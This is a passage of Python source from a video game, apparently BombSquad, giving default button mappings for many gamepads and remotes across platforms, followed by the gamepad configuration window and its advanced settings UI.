                src = jsconfig[name]["default"]
            if (src is not None):
                if (src.has_key(button)):
                    return src[button]
                else:
                    return -1

    if platform == 'windows':

        # XInput (hopefully this mapping is consistent?...)
        if name.startswith('XInput Controller'):
            try:
                return {'triggerRun2': 3, 'unassignedButtonsRun': False,
                        'buttonPickUp': 4, 'buttonBomb': 2, 'buttonStart': 8,
                        'buttonIgnored2': 7, 'triggerRun1': 6, 'buttonPunch': 3,
                        'buttonRun2': 5, 'buttonRun1': 6, 'buttonJump': 1,
                        'buttonIgnored': 11}[button]
            except Exception:
                return -1

        # ps4 controller
        if name == 'Wireless Controller':
            try:
                return {'triggerRun2': 4, 'unassignedButtonsRun': False,
                        'buttonPickUp': 4, 'buttonBomb': 3, 'buttonJump': 2,
                        'buttonStart': 10, 'buttonPunch': 1, 'buttonRun2': 5,
                        'buttonRun1': 6, 'triggerRun1': 5}[button]
            except Exception:
                return -1

    # look for some exact types..
    if bsInternal._isRunningOnFireTV():
        if name in ['Thunder', 'Amazon Fire Game Controller']:
            try:
                return {'triggerRun2': 23, 'unassignedButtonsRun': False,
                        'buttonPickUp': 101, 'buttonBomb': 98,
                        'buttonJump': 97, 'analogStickDeadZone': 0.0,
                        'startButtonActivatesDefaultWidget': False,
                        'buttonStart': 83, 'buttonPunch': 100,
                        'buttonRun2': 103, 'buttonRun1': 104,
                        'triggerRun1': 24}[button]
            except Exception:
                return -1
        elif name == 'NYKO PLAYPAD PRO':
            try:
                return {'triggerRun2': 23, 'triggerRun1': 24,
                        'buttonPickUp': 101, 'buttonBomb': 98, 'buttonJump': 97,
                        'buttonUp': 20, 'buttonLeft': 22, 'buttonRight': 23,
                        'buttonStart': 83, 'buttonPunch': 100,
                        'buttonDown': 21}[button]
            except Exception:
                return -1
        elif name == 'Logitech Dual Action':
            try:
                return {'triggerRun2': 23, 'triggerRun1': 24,
                        'buttonPickUp': 98, 'buttonBomb': 101,
                        'buttonJump': 100, 'buttonStart': 109,
                        'buttonPunch': 97}[button]
            except Exception:
                return -1
        elif name == 'Xbox 360 Wireless Receiver':
            try:
                return {'triggerRun2': 23, 'triggerRun1': 24,
                        'buttonPickUp': 101, 'buttonBomb': 98, 'buttonJump': 97,
                        'buttonUp': 20, 'buttonLeft': 22, 'buttonRight': 23,
                        'buttonStart': 83, 'buttonPunch': 100,
                        'buttonDown': 21}[button]
            except Exception:
                return -1
        elif name == 'Microsoft X-Box 360 pad':
            try:
                return {'triggerRun2': 23, 'triggerRun1': 24,
                        'buttonPickUp': 101, 'buttonBomb': 98, 'buttonJump': 97,
                        'buttonStart': 83, 'buttonPunch': 100}[button]
            except Exception:
                return -1
        elif name in ['Amazon Remote', 'Amazon Bluetooth Dev',
                      'Amazon Fire TV Remote']:
            try:
                return {'triggerRun2': 23, 'triggerRun1': 24,
                        'buttonPickUp': 24, 'buttonBomb': 91,
                        'buttonJump': 86, 'buttonUp': 20, 'buttonLeft': 22,
                        'startButtonActivatesDefaultWidget': False,
                        'buttonRight': 23, 'buttonStart': 83, 'buttonPunch': 90,
                        'buttonDown': 21}[button]
            except Exception:
                return -1

    if 'OUYA' in ua:
        if name == 'Generic X-Box pad':
            try:
                return {
                    'analogStickDeadZone': 1.2, 'buttonBomb': 98,
                    'buttonIgnored': 111, 'buttonJump': 97, 'buttonPickUp': 101,
                    'buttonPunch': 100, 'buttonStart': 109, 'triggerRun1': 12,
                    'triggerRun2': 15}[button]
            except Exception:
                return -1
        elif name == 'Logitech Dual Action':
            try:
                return {'buttonBomb': 98, 'buttonJump': 97, 'buttonPickUp': 101,
                        'buttonPunch': 100, 'buttonStart': 109}[button]
            except Exception:
                return -1
        elif name == 'Microsoft X-Box 360 pad':
            try:
                return {'analogStickDeadZone': 1.2, 'buttonBomb': 98,
                        'buttonIgnored': 83, 'buttonJump': 97,
                        'buttonPickUp': 101, 'buttonPunch': 100,
                        'buttonStart': 109, 'triggerRun1': 18,
                        'triggerRun2': 19}[button]
            except Exception:
                return -1
        elif name == 'OUYA Game Controller':
            try:
                return {'triggerRun2': 18, 'unassignedButtonsRun': False,
                        'buttonPickUp': 101, 'buttonBomb': 98, 'buttonJump': 97,
                        'analogStickDeadZone': 1.2, 'buttonLeft': 22,
                        'buttonUp': 20,
                        'startButtonActivatesDefaultWidget': False,
                        'buttonRight': 23, 'buttonStart': 83, 'buttonDown': 21,
                        'buttonPunch': 100, 'buttonRun2': 103,
                        'buttonRun1': 104, 'triggerRun1': 19,
                        'autoRecalibrateAnalogStick': True}[button]
            except Exception:
                return -1
        elif name == 'PLAYSTATION(R)3 Controller':
            try:
                return {'buttonBomb': 98, 'buttonDown': 21, 'buttonIgnored': 83,
                        'buttonJump': 97, 'buttonLeft': 22, 'buttonPickUp': 101,
                        'buttonPunch': 100, 'buttonRight': 23,
                        'buttonStart': 109, 'buttonUp': 20}[button]
            except Exception:
                return -1
        elif name == 'Sony PLAYSTATION(R)3 Controller':
            try:
                return {'buttonPickUp': 101, 'buttonBomb': 98, 'buttonJump': 97,
                        'buttonUp': 20, 'buttonLeft': 22, 'buttonRight': 23,
                        'buttonStart': 109, 'buttonPunch': 100,
                        'buttonDown': 21, 'buttonIgnored': 83}[button]
            except Exception:
                return -1
        elif name == 'Xbox 360 Wireless Receiver':
            try:
                return {'analogStickDeadZone': 1.2, 'buttonBomb': 98,
                        'buttonDown': 21, 'buttonIgnored': 83, 'buttonJump': 97,
                        'buttonLeft': 22, 'buttonPickUp': 101,
                        'buttonPunch': 100, 'buttonRight': 23,
                        'buttonStart': 109, 'buttonUp': 20, 'triggerRun1': 18,
                        'triggerRun2': 19}[button]
            except Exception:
                return -1

    elif 'NVIDIA SHIELD;' in ua:
        if 'NVIDIA Controller' in name:
            try:
                return {'triggerRun2': 19, 'triggerRun1': 18,
                        'buttonPickUp': 101, 'buttonBomb': 98, 'buttonJump': 97,
                        'analogStickDeadZone': 0.0, 'buttonStart': 109,
                        'buttonPunch': 100, 'buttonIgnored': 184,
                        'buttonIgnored2': 86}[button]
            except Exception:
                return -1

    elif 'Mac' in ua:
        if name == 'PLAYSTATION(R)3 Controller':  # ps3 gamepad
            try:
                return {'buttonLeft': 8, 'buttonUp': 5, 'buttonRight': 6,
                        'buttonDown': 7, 'buttonJump': 15, 'buttonPunch': 16,
                        'buttonBomb': 14, 'buttonPickUp': 13, 'buttonStart': 4,
                        'buttonIgnored': 17}[button]
            except Exception:
                pass
        if name == 'Wireless 360 Controller' or name == 'Controller':
            # xbox360 gamepads
            try:
                return {'analogStickDeadZone': 1.2, 'buttonBomb': 13,
                        'buttonDown': 2, 'buttonJump': 12, 'buttonLeft': 3,
                        'buttonPickUp': 15, 'buttonPunch': 14, 'buttonRight': 4,
                        'buttonStart': 5, 'buttonUp': 1, 'triggerRun1': 5,
                        'triggerRun2': 6, 'buttonIgnored': 11}[button]
            except Exception:
                return -1
        if name in ['Logitech Dual Action', 'Logitech Cordless RumblePad 2']:
            try:
                return {'buttonJump': 2, 'buttonPunch': 1, 'buttonBomb': 3,
                        'buttonPickUp': 4, 'buttonStart': 10}[button]
            except Exception:
                return -1
        if name == 'GamePad Pro USB ':  # old gravis gamepad
            try:
                return {'buttonJump': 2, 'buttonPunch': 1, 'buttonBomb': 3,
                        'buttonPickUp': 4, 'buttonStart': 10}[button]
            except Exception:
                return -1
        if name == 'Microsoft SideWinder Plug & Play Game Pad':
            try:
                return {'buttonJump': 1, 'buttonPunch': 3, 'buttonBomb': 2,
                        'buttonPickUp': 4, 'buttonStart': 6}[button]
            except Exception:
                return -1
        # Saitek P2500 Rumble Force Pad.. (hopefully works for others too?..)
        if name == 'Saitek P2500 Rumble Force Pad':
            try:
                return {'buttonJump': 3, 'buttonPunch': 1, 'buttonBomb': 4,
                        'buttonPickUp': 2, 'buttonStart': 11}[button]
            except Exception:
                return -1
        # some crazy 'Senze' dual gamepad (the second half is handled under
        # the hood)
        if name == 'Twin USB Joystick':
            try:
                return {'analogStickLR': 3, 'analogStickLR_B': 7,
                        'analogStickUD': 4, 'analogStickUD_B': 8,
                        'buttonBomb': 2, 'buttonBomb_B': 14, 'buttonJump': 3,
                        'buttonJump_B': 15, 'buttonPickUp': 1,
                        'buttonPickUp_B': 13, 'buttonPunch': 4,
                        'buttonPunch_B': 16, 'buttonRun1': 7,
                        'buttonRun1_B': 19, 'buttonRun2': 8, 'buttonRun2_B': 20,
                        'buttonStart': 10, 'buttonStart_B': 22,
                        'enableSecondary': 1,
                        'unassignedButtonsRun': False}[button]
            except Exception:
                return -1
        if name == 'USB Gamepad ':  # some weird 'JITE' gamepad
            try:
                return {'analogStickLR': 4, 'analogStickUD': 5, 'buttonJump': 3,
                        'buttonPunch': 4, 'buttonBomb': 2, 'buttonPickUp': 1,
                        'buttonStart': 10}[button]
            except Exception:
                return -1

    defaultAndroidMapping = {
        'triggerRun2': 19, 'unassignedButtonsRun': False, 'buttonPickUp': 101,
        'buttonBomb': 98, 'buttonJump': 97, 'buttonStart': 83, 'buttonStart2':
        109, 'buttonPunch': 100, 'buttonRun2': 104, 'buttonRun1': 103,
        'triggerRun1': 18, 'buttonLeft': 22, 'buttonRight': 23, 'buttonUp': 20,
        'buttonDown': 21, 'buttonVRReorient': 110}

    # generic android...
    if platform == 'android':

        # steelseries stratus xl
        if name == 'SteelSeries Stratus XL':
            try:
                return {'triggerRun2': 23, 'unassignedButtonsRun': False,
                        'buttonPickUp': 101, 'buttonBomb': 98, 'buttonJump': 97,
                        'buttonStart': 83, 'buttonStart2': 109,
                        'buttonPunch': 100, 'buttonRun2': 104,
                        'buttonRun1': 103, 'triggerRun1': 24,
                        'buttonLeft': 22, 'buttonRight': 23, 'buttonUp': 20,
                        'buttonDown': 21, 'buttonVRReorient': 108}[button]
            except Exception:
                return -1

        # adt-1 gamepad (use funky 'mode' button for start)
        if name == 'Gamepad':
            try:
                return {'triggerRun2': 19, 'unassignedButtonsRun': False,
                        'buttonPickUp': 101,
                        'buttonBomb': 98, 'buttonJump': 97, 'buttonStart': 111,
                        'buttonPunch': 100,
                        'startButtonActivatesDefaultWidget': False,
                        'buttonRun2': 104, 'buttonRun1': 103,
                        'triggerRun1': 18}[button]
            except Exception:
                return -1
        # nexus player remote
        if name == 'Nexus Remote':
            try:
                return {'triggerRun2': 19, 'unassignedButtonsRun': False,
                        'buttonPickUp': 101, 'buttonBomb': 98, 'buttonJump': 97,
                        'buttonUp': 20, 'buttonLeft': 22, 'buttonDown': 21,
                        'buttonRight': 23, 'buttonStart': 83,
                        'buttonStart2': 109, 'buttonPunch': 24,
                        'buttonRun2': 104, 'buttonRun1': 103,
                        'triggerRun1': 18}[button]
            except Exception:
                return -1

        if name == "virtual-remote":
            try:
                return {'triggerRun2': 19, 'unassignedButtonsRun': False,
                        'buttonPickUp': 101, 'buttonBomb': 98,
                        'buttonStart': 83, 'buttonJump': 24, 'buttonUp': 20,
                        'buttonLeft': 22, 'buttonRight': 23, 'triggerRun1': 18,
                        'buttonStart2': 109, 'buttonPunch': 100,
                        'buttonRun2': 104, 'buttonRun1': 103, 'buttonDown': 21,
                        'startButtonActivatesDefaultWidget': False,
                        'uiOnly': True}[button]
            except Exception:
                return -1

        # flag particular gamepads to use exact android defaults..
        # (so they don't even ask to configure themselves)
        if name in [
                'Samsung Game Pad EI-GP20', 'ASUS Gamepad'] or name.startswith(
                'Freefly VR Glide'):
            try:
                return defaultAndroidMapping[button]
            except Exception:
                return -1

        # nvidia controller is default, but gets some strange keypresses we want
        # to ignore.. touching the touchpad, so lets ignore those.
        if 'NVIDIA Controller' in name:
            try:
                return {'triggerRun2': 19, 'unassignedButtonsRun': False,
                        'buttonPickUp': 101, 'buttonIgnored': 126,
                        'buttonIgnored2': 1, 'buttonBomb': 98, 'buttonJump': 97,
                        'buttonStart': 83, 'buttonStart2': 109,
                        'buttonPunch': 100, 'buttonRun2': 104,
                        'buttonRun1': 103, 'triggerRun1': 18}[button]
            except Exception:
                return -1

        # ali box controller
        if name.startswith('alitv-Vgamepad'):
            try:
                return {'triggerRun2': 23, 'unassignedButtonsRun': False,
                        'buttonPickUp': 101, 'buttonBomb': 98,
                        'buttonJump': 97, 'buttonStart': 109,
                        'buttonStart2': 109, 'buttonPunch': 100,
                        'buttonRun2': 104, 'buttonRun1': 103, 'triggerRun1': 24,
                        'buttonLeft': 22, 'buttonRight': 23, 'buttonUp': 20,
                        'buttonDown': 21
                        }[button]
            except Exception:
                return -1

        # ali remotes
        if name.startswith('ALITV RC_MIC') or name.startswith('sun6i-ir'):
            try:
                return {'triggerRun2': 19, 'unassignedButtonsRun': False,
                        'buttonPickUp': 101, 'buttonBomb': 98,
                        'buttonStart': 83, 'buttonJump': 24, 'buttonUp': 20,
                        'buttonLeft': 22, 'buttonRight': 23, 'triggerRun1': 18,
                        'buttonStart2': 109, 'buttonPunch': 100,
                        'buttonRun2': 104, 'buttonRun1': 103, 'buttonDown': 21,
                        'startButtonActivatesDefaultWidget': False,
                        'uiOnly': True, 'buttonIgnored': 142,
                        'buttonIgnored2': 143}[button]
            except Exception:
                return -1

    # default keyboard vals across platforms..
    if name == 'Keyboard' and uniqueID == '#2':
        if platform == 'mac' and subplatform == 'appstore':
            try:
                return {'buttonJump': 258, 'buttonPunch': 257,
                        'buttonBomb': 262, 'buttonPickUp': 261, 'buttonUp': 273,
                        'buttonDown': 274, 'buttonLeft': 276,
                        'buttonRight': 275, 'buttonStart': 263}[button]
            except Exception:
                pass
        else:
            try:
                return {'buttonPickUp': 1073741917, 'buttonBomb': 1073741918,
                        'buttonJump': 1073741914, 'buttonUp': 1073741906,
                        'buttonLeft': 1073741904, 'buttonRight': 1073741903,
                        'buttonStart': 1073741919, 'buttonPunch': 1073741913,
                        'buttonDown': 1073741905}[button]
            except Exception:
                pass
    if name == 'Keyboard' and uniqueID == '#1':
        try:
            return {'buttonJump': 107, 'buttonPunch': 106, 'buttonBomb': 111,
                    'buttonPickUp': 105, 'buttonUp': 119, 'buttonDown': 115,
                    'buttonLeft': 97, 'buttonRight': 100}[button]
        except Exception:
            pass

    # ok, this gamepad's not in our specific preset list; at this point let's
    # error if requested to, otherwise lets try some good guesses based on
    # known types...
    if exceptionOnUnknown:
        raise Exception("Unknown controller type")

    # leaving these in here for now but not gonna add any more now that we have
    # fancy-pants config sharing across the internet...
    if 'Mac' in ua:
        if 'PLAYSTATION' in name:  # ps3 gamepad?..
            try:
                return {'buttonLeft': 8, 'buttonUp': 5, 'buttonRight': 6,
                        'buttonDown': 7, 'buttonJump': 15, 'buttonPunch': 16,
                        'buttonBomb': 14, 'buttonPickUp': 13,
                        'buttonStart': 4}[button]
            except Exception:
                pass
        # Dual Action Config - hopefully applies to more...
        if 'Logitech' in name:
            try:
                return {'buttonJump': 2, 'buttonPunch': 1, 'buttonBomb': 3,
                        'buttonPickUp': 4, 'buttonStart': 10}[button]
            except Exception:
                pass
        # Saitek P2500 Rumble Force Pad.. (hopefully works for others too?..)
        if 'Saitek' in name:
            try:
                return {'buttonJump': 3, 'buttonPunch': 1, 'buttonBomb': 4,
                        'buttonPickUp': 2, 'buttonStart': 11}[button]
            except Exception:
                pass
        if 'GamePad' in name:  # gravis stuff?...
            try:
                return {'buttonJump': 2, 'buttonPunch': 1, 'buttonBomb': 3,
                        'buttonPickUp': 4, 'buttonStart': 10}[button]
            except Exception:
                pass

    # reasonable defaults..
    if platform == 'android':
        if bsInternal._isRunningOnFireTV():
            # mostly same as default firetv controller..
            try:
                return {'triggerRun2': 23, 'triggerRun1': 24,
                        'buttonPickUp': 101, 'buttonBomb': 98,
                        'buttonJump': 97, 'buttonStart': 83,
                        'buttonPunch': 100, 'buttonDown': 21, 'buttonUp': 20,
                        'buttonLeft': 22, 'buttonRight': 23,
                        'startButtonActivatesDefaultWidget': False, }[button]
            except Exception:
                return -1
        else:

            # mostly same as 'Gamepad' except with 'menu' for default start
            # button instead of 'mode'
            try:
                return defaultAndroidMapping[button]
            except Exception:
                return -1
    else:
        try:
            return {'buttonJump': 1, 'buttonPunch': 2, 'buttonBomb': 3,
                    'buttonPickUp': 4, 'buttonStart': 5}[button]
        except Exception:
            pass

    # epic fail.
    return -1


class GamePadConfigWindow(Window):

    def __init__(
            self, gamePad, isMainMenu=True, transition='inRight',
            transitionOut='outRight', settings=None):

        self._input = gamePad

        # if this fails, our input device went away or something..
        # just return an empty zombie then
        try:
            self._name = self._input.getName()
        except Exception:
            return

        self._r = 'configGamepadWindow'

        self._settings = settings
        self._transitionOut = transitionOut

        # we're a secondary gamepad if supplied with settings
        self._isSecondary = (settings is not None)
        self._ext = '_B' if self._isSecondary else ''
        self._isMainMenu = isMainMenu
        self._displayName = self._name
        buttonWidth = 240
        self._width = 700 if self._isSecondary else 730
        self._height = 440 if self._isSecondary else 450
        self._spacing = 40
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            scale=1.63 if gSmallUI else 1.35 if gMedUI else 1.0,
            stackOffset=(-20, -16) if gSmallUI else(0, 0),
            transition=transition)
        # dont ask to config joysticks while we're in here..
        global gCanAskToConfigGamePads
        gCanAskToConfigGamePads = False

        self._rebuildUI()

    def _rebuildUI(self):

        # clear existing UI
        for w in self._rootWidget.getChildren():
            w.delete()

        self._textWidgets = {}

        # if we were supplied with settings, we're a secondary joystick and
        # just operate on that. in the other (normal) case we make our own..
        if not self._isSecondary:

            # fill our temp config with present values (for our primary and
            # secondary controls)
            self._settings = {}
            for s in [
                'buttonJump', 'buttonJump_B', 'buttonPunch', 'buttonPunch_B',
                'buttonBomb', 'buttonBomb_B', 'buttonPickUp', 'buttonPickUp_B',
                'buttonStart', 'buttonStart_B', 'buttonStart2',
                'buttonStart2_B', 'buttonUp', 'buttonUp_B', 'buttonDown',
                'buttonDown_B', 'buttonLeft', 'buttonLeft_B', 'buttonRight',
                'buttonRight_B', 'buttonRun1', 'buttonRun1_B', 'buttonRun2',
                'buttonRun2_B', 'triggerRun1', 'triggerRun1_B', 'triggerRun2',
                'triggerRun2_B', 'buttonIgnored', 'buttonIgnored_B',
                'buttonIgnored2', 'buttonIgnored2_B', 'buttonIgnored3',
                'buttonIgnored3_B', 'buttonIgnored4', 'buttonIgnored4_B',
                'buttonVRReorient', 'buttonVRReorient_B', 'analogStickDeadZone',
                'analogStickDeadZone_B', 'dpad', 'dpad_B',
                'unassignedButtonsRun', 'unassignedButtonsRun_B',
                'startButtonActivatesDefaultWidget',
                'startButtonActivatesDefaultWidget_B', 'uiOnly', 'uiOnly_B',
                'ignoreCompletely', 'ignoreCompletely_B',
                'autoRecalibrateAnalogStick', 'autoRecalibrateAnalogStick_B',
                'analogStickLR', 'analogStickLR_B', 'analogStickUD',
                    'analogStickUD_B', 'enableSecondary', ]:
                val = getControllerValue(self._input, s)
                if val != -1:
                    self._settings[s] = val

        # if not self._isSecondary:
        if self._isSecondary:
            backButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(self._width - 180, self._height - 65),
                autoSelect=True, size=(160, 60),
                label=bs.Lstr(resource='doneText'),
                scale=0.9, onActivateCall=self._save)
            bs.containerWidget(
                edit=self._rootWidget, startButton=backButton,
                onCancelCall=backButton.activate)
            cancelButton = None
        else:
            cancelButton = b = bs.buttonWidget(
                parent=self._rootWidget, position=(51, self._height - 65),
                autoSelect=True, size=(160, 60),
                label=bs.Lstr(resource='cancelText'),
                scale=0.9, onActivateCall=self._cancel)
            bs.containerWidget(edit=self._rootWidget, cancelButton=cancelButton)
            backButton = None

        if not self._isSecondary:
            saveButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(self._width - (165 if self._isSecondary else 195),
                          self._height - 65),
                size=((160 if self._isSecondary else 180),
                      60),
                autoSelect=True, label=bs.Lstr(resource='doneText')
                if self._isSecondary else bs.Lstr(resource='makeItSoText'),
                scale=0.9, onActivateCall=self._save)
            bs.containerWidget(edit=self._rootWidget, startButton=saveButton)
        else:
            saveButton = None

        if not self._isSecondary:

            v = self._height - 59
            t = bs.textWidget(
                parent=self._rootWidget, position=(0, v + 5),
                size=(self._width, 25),
                text=bs.Lstr(resource=self._r + '.titleText'),
                color=gTitleColor, maxWidth=310, hAlign="center",
                vAlign="center")
            v -= 48

            t = bs.textWidget(
                parent=self._rootWidget, position=(0, v + 3),
                size=(self._width, 25),
                text=self._name, color=gInfoTextColor, maxWidth=self._width *
                0.9, hAlign="center", vAlign="center")

            v -= self._spacing * 1

            bs.textWidget(
                parent=self._rootWidget, position=(50, v + 10),
                size=(self._width - 100, 30),
                text=bs.Lstr(resource=self._r + '.appliesToAllText'),
                maxWidth=330, scale=0.65, color=(0.5, 0.6, 0.5, 1.0),
                hAlign='center', vAlign='center')
            v -= 70
            self._enableCheckBox = None
        else:
            v = self._height - 49
            t = bs.textWidget(
                parent=self._rootWidget, position=(0, v + 5),
                size=(self._width, 25),
                text=bs.Lstr(resource=self._r + '.secondaryText'),
                color=gTitleColor, maxWidth=300, hAlign="center",
                vAlign="center")
            v -= self._spacing * 1

            bs.textWidget(
                parent=self._rootWidget, position=(50, v + 10),
                size=(self._width - 100, 30),
                text=bs.Lstr(resource=self._r + '.secondHalfText'),
                maxWidth=300, scale=0.65, color=(0.6, 0.8, 0.6, 1.0),
                hAlign='center')
            self._enableCheckBox = bs.checkBoxWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5 - 80, v - 73),
                value=self._getEnableSecondaryValue(),
                autoSelect=True, onValueChangeCall=self._enableCheckBoxChanged,
                size=(200, 30),
                text=bs.Lstr(resource=self._r + '.secondaryEnableText'),
                scale=1.2)
            v = self._height - 205

        hOffs = 160
        dist = 70

        dColor = (0.4, 0.4, 0.8)

        sx = 1.2
        sy = 0.98

        dpm = bs.Lstr(resource=self._r+'.pressAnyButtonOrDpadText')
        dpm2 = bs.Lstr(resource=self._r+'.ifNothingHappensTryAnalogText')
        bLTop = self._captureButton(pos=(hOffs, v + sy * dist),
                                    color=dColor, button='buttonUp' + self._ext,
                                    texture=bs.getTexture('upButton'),
                                    scale=1.0, message=dpm, message2=dpm2)
        bLLeft = self._captureButton(
            pos=(hOffs - sx * dist, v),
            color=dColor, button='buttonLeft' + self._ext, texture=bs.
            getTexture('leftButton'),
            scale=1.0, message=dpm, message2=dpm2)
        bLRight = self._captureButton(
            pos=(hOffs + sx * dist, v),
            color=dColor, button='buttonRight' + self._ext,
            texture=bs.getTexture('rightButton'),
            scale=1.0, message=dpm, message2=dpm2)
        bLBottom = self._captureButton(
            pos=(hOffs, v - sy * dist),
            color=dColor, button='buttonDown' + self._ext, texture=bs.
            getTexture('downButton'),
            scale=1.0, message=dpm, message2=dpm2)

        dpm3 = bs.Lstr(resource=self._r+'.ifNothingHappensTryDpadText')
        bAxes = self._captureButton(
            pos=(hOffs + 130, v - 125),
            color=(0.4, 0.4, 0.6),
            button='analogStickLR' + self._ext, maxWidth=140,
            texture=bs.getTexture('analogStick'),
            scale=1.2, message=bs.Lstr(
                resource=self._r + '.pressLeftRightText'),
            message2=dpm3)

        bStart = self._captureButton(pos=(self._width * 0.5, v),
                                     color=(0.4, 0.4, 0.6),
                                     button='buttonStart' + self._ext,
                                     texture=bs.getTexture('startButton'),
                                     scale=0.7)

        hOffs = self._width-160

        bRTop = self._captureButton(pos=(hOffs, v + sy * dist),
                                    color=(0.6, 0.4, 0.8),
                                    button='buttonPickUp' + self._ext,
                                    texture=bs.getTexture('buttonPickUp'),
                                    scale=1.0)
        bRLeft = self._captureButton(pos=(hOffs - sx * dist, v),
                                     color=(0.7, 0.5, 0.1),
                                     button='buttonPunch' + self._ext,
                                     texture=bs.getTexture('buttonPunch'),
                                     scale=1.0)
        bRRight = self._captureButton(
            pos=(hOffs + sx * dist, v),
            color=(0.5, 0.2, 0.1),
            button='buttonBomb' + self._ext,
            texture=bs.getTexture('buttonBomb'),
            scale=1.0)
        bRBottom = self._captureButton(
            pos=(hOffs, v - sy * dist),
            color=(0.2, 0.5, 0.2),
            button='buttonJump' + self._ext,
            texture=bs.getTexture('buttonJump'),
            scale=1.0)

        self._advancedButton = bAdvanced = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True, label=bs.Lstr(
                resource=self._r + '.advancedText'),
            textScale=0.9, color=(0.45, 0.4, 0.5),
            textColor=(0.65, 0.6, 0.7),
            position=(self._width - 300, 30),
            size=(130, 40),
            onActivateCall=self._doAdvanced)

        try:
            if cancelButton is not None and saveButton is not None:
                bs.widget(edit=cancelButton, rightWidget=saveButton)
                bs.widget(edit=saveButton, leftWidget=cancelButton)
        except Exception:
            bs.printException('error wiring gamepad config window')

    def _doAdvanced(self):

        class _AdvancedWindow(Window):

            def __init__(self, parentWindow, transition='inRight'):
                self._parentWindow = parentWindow

                env = bs.getEnvironment()

                self._r = parentWindow._r
                self._width = 900 if gSmallUI else 700
                self._xInset = xInset = 100 if gSmallUI else 0
                self._height = 402 if gSmallUI else 512
                self._textWidgets = {}
                self._rootWidget = bs.containerWidget(
                    transition='inScale', size=(self._width, self._height),
                    scale=1.06 *
                    (1.85 if gSmallUI else 1.35 if gMedUI else 1.0),
                    stackOffset=(0, -25) if gSmallUI else(0, 0),
                    scaleOriginStackOffset=(parentWindow._advancedButton.
                                            getScreenSpaceCenter()))

                t = bs.textWidget(
                    parent=self._rootWidget,
                    position=(self._width * 0.5, self._height -
                              (40 if gSmallUI else 34)),
                    size=(0, 0),
                    text=bs.Lstr(resource=self._r + '.advancedTitleText'),
                    maxWidth=320, color=gTitleColor, hAlign="center",
                    vAlign="center")

                backButton = b = bs.buttonWidget(
                    parent=self._rootWidget, autoSelect=True,
                    position=(self._width - (176 + xInset),
                              self._height - (60 if gSmallUI else 55)),
                    size=(120, 48),
                    textScale=0.8, label=bs.Lstr(resource='doneText'),
                    onActivateCall=self._done)
                bs.containerWidget(
                    edit=self._rootWidget, startButton=b,
                    onCancelCall=b.activate)

                self._scrollWidth = self._width - (100+2*xInset)
                self._scrollHeight = self._height - 110
                self._subWidth = self._scrollWidth-20
                self._subHeight = (940 if self._parentWindow._isSecondary
                                   else 1040)
                if env['vrMode']:
                    self._subHeight += 50
                self._scrollWidget = bs.scrollWidget(
                    parent=self._rootWidget,
                    position=((self._width-self._scrollWidth)*0.5,
                              self._height - 65-self._scrollHeight),
                    size=(self._scrollWidth, self._scrollHeight))
                self._subContainer = c = bs.containerWidget(
                    parent=self._scrollWidget,
                    size=(self._subWidth, self._subHeight),
                    background=False)
                bs.containerWidget(
                    edit=self._scrollWidget, claimsLeftRight=True,
                    claimsTab=True, selectionLoopToParent=True)
                bs.containerWidget(
                    edit=self._subContainer, claimsLeftRight=True,
                    claimsTab=True, selectionLoopToParent=True)
                bs.containerWidget(edit=self._rootWidget,
                                   selectedChild=self._scrollWidget)

                h = 30
                v = self._subHeight - 10

                h2 = h + 12

                # dont allow secondary joysticks to handle unassigned buttons
                if not self._parentWindow._isSecondary:
                    v -= 40
                    c1 = bs.checkBoxWidget(
                        parent=self._subContainer, position=(h + 70, v),
                        size=(500, 30),
                        text=bs.Lstr(
                            resource=self._r + '.unassignedButtonsRunText'),
                        textColor=(0.8, 0.8, 0.8),
                        maxWidth=330, scale=1.0,
                        onValueChangeCall=self._parentWindow.
                        _setUnassignedButtonsRunValue, autoSelect=True,
                        value=self._parentWindow
                        ._getUnassignedButtonsRunValue())
                    bs.widget(edit=c1, upWidget=backButton)
                v -= 60
                cb = self._captureButton(
                    pos=(h2, v),
                    name=bs.Lstr(resource=self._r + '.runButton1Text'),
                    control='buttonRun1' + self._parentWindow._ext)
                if self._parentWindow._isSecondary:
                    for w in cb:
                        bs.widget(edit=w, upWidget=backButton)
                v -= 42
                self._captureButton(
                    pos=(h2, v),
                    name=bs.Lstr(resource=self._r + '.runButton2Text'),
                    control='buttonRun2' + self._parentWindow._ext)
                bs.textWidget(
                    parent=self._subContainer,
                    position=(self._subWidth * 0.5, v - 24),
                    size=(0, 0),
                    text=bs.Lstr(
                        resource=self._r + '.runTriggerDescriptionText'),
                    color=(0.7, 1, 0.7, 0.6),
                    maxWidth=self._subWidth * 0.8, scale=0.7, hAlign='center',
                    vAlign='center')

                v -= 85

                self._captureButton(
                    pos=(h2, v),
                    name=bs.Lstr(resource=self._r + '.runTrigger1Text'),
                    control='triggerRun1' + self._parentWindow._ext,
                    message=bs.Lstr(
                        resource=self._r + '.pressAnyAnalogTriggerText'))
                v -= 42
                self._captureButton(
                    pos=(h2, v),
                    name=bs.Lstr(resource=self._r + '.runTrigger2Text'),
                    control='triggerRun2' + self._parentWindow._ext,
                    message=bs.Lstr(
                        resource=self._r + '.pressAnyAnalogTriggerText'))

                # in vr mode, allow assigning a reset-view button
                if env['vrMode']:
                    v -= 50
                    self._captureButton(
                        pos=(h2, v),
                        name=bs.Lstr(
                            resource=self._r + '.vrReorientButtonText'),
                        control='buttonVRReorient' + self._parentWindow._ext)

                v -= 60
                self._captureButton(
                    pos=(h2, v),
                    name=bs.Lstr(
                        resource=self._r + '.extraStartButtonText'),
                    control='buttonStart2' + self._parentWindow._ext)
                v -= 60
                self._captureButton(
                    pos=(h2, v),
                    name=bs.Lstr(resource=self._r + '.ignoredButton1Text'),
                    control='buttonIgnored' + self._parentWindow._ext)
                v -= 42
                self._captureButton(
                    pos=(h2, v),
                    name=bs.Lstr(resource=self._r + '.ignoredButton2Text'),
                    control='buttonIgnored2' + self._parentWindow._ext)
                v -= 42
                self._captureButton(
                    pos=(h2, v),
                    name=bs.Lstr(resource=self._r + '.ignoredButton3Text'),
                    control='buttonIgnored3' + self._parentWindow._ext)
                v -= 42
                self._captureButton(
                    pos=(h2, v),
                    name=bs.Lstr(resource=self._r + '.ignoredButton4Text'),
                    control='buttonIgnored4' + self._parentWindow._ext)
                bs.textWidget(
                    parent=self._subContainer,
                    position=(self._subWidth * 0.5, v - 14),
